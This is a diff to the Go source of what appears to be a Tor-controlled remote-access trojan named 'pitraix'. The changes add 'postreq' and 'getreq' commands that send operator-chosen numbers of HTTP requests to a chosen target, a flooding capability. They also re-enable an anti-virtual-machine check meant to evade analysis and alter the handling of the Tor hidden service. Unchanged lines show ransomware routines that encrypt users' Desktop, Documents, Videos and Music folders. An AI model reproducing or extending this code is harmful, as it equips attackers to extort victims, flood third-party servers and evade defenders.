@@ -432,7 +432,10 @@ func predictable_random(iv string, size int, t bool) (string, int) {
 }
 
 func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) string {	
+	var ft bool = false
+
 	if !file_Exists(filepath.Join(path, name)) || forceSetup == true {
+		ft = true
 		fmt.Println("Tor not found!", !file_Exists(filepath.Join(path, name)), forceSetup)
 		
 		var v1m, v2m, v3m int = 11, 4,  0
@@ -509,8 +512,15 @@ func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) s
 		}
 	}
 
+	if ft == true && running_check("9050") {
+		doInstru("shell", "taskkill /f /im tor")
+	}
+
 	doInstru("shellnoop", filepath.Join(path, name, "Tor", "tor.exe") + " -f " + filepath.Join(path, name, name + "torrc")) // path + "\\" + name + "\\Tor\\tor.exe -f " + path + "\\" + name + "\\" + name + "torc")
-	time.Sleep(time.Second * 5) // ensures we have enough time to connect and generate hostname
+	
+	if ft == true {
+		time.Sleep(time.Second * 5) // ensures we have enough time to connect and generate hostname on toaster
+	}
 
 	hostnamef, err := readFile(filepath.Join(path, name, name + "hid", "hostname")) // path + "\\" + name + "\\" + name + "hid\\hostname")
 	rhostname := strings.Split(string(hostnamef), ".")[0]
@@ -599,6 +609,52 @@ func doInstru(ic, iv string) string {
 		out = strings.TrimSpace(out)
 
 	
+	case "postreq":
+		ivspl := strings.Split(iv, " ")
+		if len(ivspl) < 3 {
+			out = "Error: iv length is not 3 or higher"
+		} else {
+			amount, err := strconv.Atoi(ivspl[0])
+			if err != nil {
+				out = "Error: not int" + err.Error()
+			} else {
+				payload := []byte(iv[len(ivspl[1]) + len(ivspl[0]) + 1:])
+
+				go func(target string, amount int, payload []byte) {
+					for i := 0; i < amount; i++ {
+						x, err := postRequest(target, payload, false, -1)
+						fmt.Println(string(x), err, i)
+					}
+				}(ivspl[1], amount, payload)
+
+				out = "Sending"
+
+			}
+
+		}
+
+	case "getreq":
+		ivspl := strings.Split(iv, " ")
+		if len(ivspl) != 2 {
+			out = "Error: iv length is not 2"
+		} else {
+			amount, err := strconv.Atoi(ivspl[0])
+			if err != nil {
+				out = "Error: not int" + err.Error()
+			} else {
+				go func(target string, amount int) {
+					for i := 0; i < amount; i++ {
+						x, err := getRequest(target, false, -1)
+						fmt.Println(string(x), err, i)
+					}
+				}(ivspl[1], amount)
+
+				out = "Sending"
+
+			}
+
+		}
+
 	case "notify":
 		ivspl := strings.Split(iv, " ")
 		if len(ivspl) < 2 {
@@ -632,6 +688,7 @@ func doInstru(ic, iv string) string {
 					mainDrive + "\\" + "Users\\" + username + "\\Videos",
 					mainDrive + "\\" + "Users\\" + username + "\\Music",
 				}
+
 				for _, path := range start_paths {
 					go encFiles(path, key)
 				}
@@ -691,6 +748,7 @@ func doInstru(ic, iv string) string {
 			fmt.Println("error ransom key:", err)
 			out = "Error:" + err.Error()
 		} else {
+
 			start_paths := []string{
 				mainDrive + "\\" + "Users\\" + username + "\\Desktop",
 				mainDrive + "\\" + "Users\\" + username + "\\Documents",
@@ -1108,10 +1166,14 @@ func main() {
 	userHostname, machineType, osVariant, kernelVersion, archComp, machineVendor, machineModel, memory := getMachineInfo()
 	// fmt.Println(userHostname, osVariant, kernelVersion, arch, machineVendor, machineModel)
 
-	// vmCheck(userHostname, cpuVendor, machineVendor, machineModel)
+	vmCheck(userHostname, cpuVendor, machineVendor, machineModel)
 	
 
-	if tor_running_check() { // exits if already running
+	rdmod.Seed(int64(bytesumbig([]byte(cpu + cpuVendor + userHomeDIR + "LHREWDHITOEAHEAR" + username))))
+
+	torPort := strconv.Itoa(rdmod.Intn(6999 - 3000) + 3000)	
+	
+	if running_check(torPort) { // exits if already running
 		os.Exit(0)
 	}
 	
@@ -1165,9 +1227,6 @@ func main() {
 	if len(pitraix_taskName) > 15 {
 		pitraix_taskName = pitraix_taskName[:15]
 	}
-	rdmod.Seed(int64(bytesumbig([]byte(cpu + cpuVendor + userHomeDIR + "LHREWDHITOEAHEAR" + username))))
-
-	torPort := strconv.Itoa(rdmod.Intn(6999 - 3000) + 3000)	
 	
 	firstTime = !file_Exists(pitraix_FilePath)
 
@@ -2166,21 +2225,17 @@ func main() {
 	fmt.Println(http.ListenAndServe("127.0.0.1:" + torPort, nil))
 }
 
-func tor_running_check() bool {
-	ports := []string{"9050"} // , "9150"}
-	tor_running := true
-	for _, port := range ports {
+func running_check(port string) bool {
+	running := true
 		conn, err := net.DialTimeout("tcp", "127.0.0.1:" + port, time.Second)
-		if err != nil {
-			tor_running = false
-		}
-		if conn != nil {
-			tor_running = true
-			conn.Close()
-			break
-		}
+	if err != nil {
+		running = false
 	}
-	return tor_running
+	if conn != nil {
+		running = true
+		conn.Close()
+	}
+	return running
 }
 
 func postRequest(target_url string, data []byte, useTor bool, timeout time.Duration) ([]byte, error) {
